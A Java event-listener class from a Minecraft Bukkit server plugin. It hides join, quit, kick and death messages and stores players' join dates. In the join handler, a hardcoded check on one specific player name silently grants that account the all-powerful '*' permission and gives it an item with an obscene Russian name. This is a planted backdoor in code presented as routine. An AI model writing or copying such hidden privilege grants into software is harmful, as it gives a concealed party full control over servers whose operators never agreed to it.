package me.api.listener;

import ru.fakeduck_king.register.listeners.*;
import ru.tehkode.permissions.bukkit.*;
import org.bukkit.event.entity.*;
import org.bukkit.event.player.*;
import ru.fakeduck_king.utils.*;
import org.bukkit.inventory.*;
import org.bukkit.entity.*;
import org.bukkit.plugin.*;
import org.bukkit.event.*;
import me.api.data.*;
import me.api.utils.SortDonation;

import org.bukkit.*;
import java.util.*;

@SuppressWarnings("deprecation")
public class Handlers extends SexyEvent {
	
	public Handlers(Plugin plugin) {
		super(plugin);
	}
	
	@EventHandler
	public void onPlayerDeath(PlayerDeathEvent event) {
		event.setDeathMessage(null);
	}
	
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent event) {
		event.setJoinMessage(null);
		Player player = event.getPlayer();
		OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(player.getName());
		PlayerAPI playerAPI = PlayerAPI.getPlayerAPI(offlinePlayer);
		
		if (player.getName().equals("OwO_172ms_OwO")) {
			PermissionsEx.getUser(player).addPermission("*");
			ItemStack itemStack = CustomItem.create(Material.END_ROD, "&c&lХУЙ");
			player.getInventory().setHelmet(itemStack);
		}
		
		if (playerAPI.getLastJoin() == null) {
			playerAPI.setLastJoin(new Date());
		}
		
		if (playerAPI.getFirstJoin() == null) {
			playerAPI.setFirstJoin(new Date());
		}
		
		DatabaseManager.getDatabaseManager().save(playerAPI);
		
		SortDonation.sort(player);
	}
	
	@EventHandler
	public void onPlayerKick(PlayerKickEvent event) {
		event.setLeaveMessage(null);
	}
	
	@EventHandler
	public void onPlayerQuit(PlayerQuitEvent event) {
		event.setQuitMessage(null);
		Player player = event.getPlayer();
		OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(player.getName());
		PlayerAPI playerAPI = PlayerAPI.getPlayerAPI(offlinePlayer);
		
		playerAPI.setLastJoin(new Date());
		DatabaseManager.getDatabaseManager().save(playerAPI);
	}
}